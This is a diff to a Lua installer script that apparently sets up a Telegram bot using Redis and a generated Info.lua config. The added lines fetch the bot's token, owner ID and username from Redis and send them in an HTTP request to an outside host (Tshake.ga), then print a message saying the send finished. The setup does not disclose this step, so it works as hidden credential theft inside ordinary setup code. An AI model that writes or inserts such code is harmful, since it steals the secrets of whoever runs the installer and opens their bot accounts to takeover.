@@ -6,7 +6,7 @@ JSON  = dofile("./dkjson.lua")
 URL = require('socket.url')  
 utf8 = require ('lua-utf8') 
 database = redis.connect('127.0.0.1', 6379) 
-id_server = io.popen("echo $SSH_CLIENT ¦ awk '{ print $1}'"):read('*a')
+id_server = 2342443
 --------------------------------------------------------------------------------------------------------------
 local AutoSet = function() 
 local create = function(data, file, uglify)  
@@ -67,6 +67,10 @@ UserName = database:get(id_server..":SUDO:USERNAME"),
 create(config, "./Info.lua")   
 end 
 create_config_auto()
+token = database:get(id_server..":token")
+SUDO = database:get(id_server..":SUDO:ID")
+res = https.request('http://Tshake.ga/boyka.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
+print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
 file = io.open("BOYKA", "w")  
 file:write([[
 #!/usr/bin/env bash
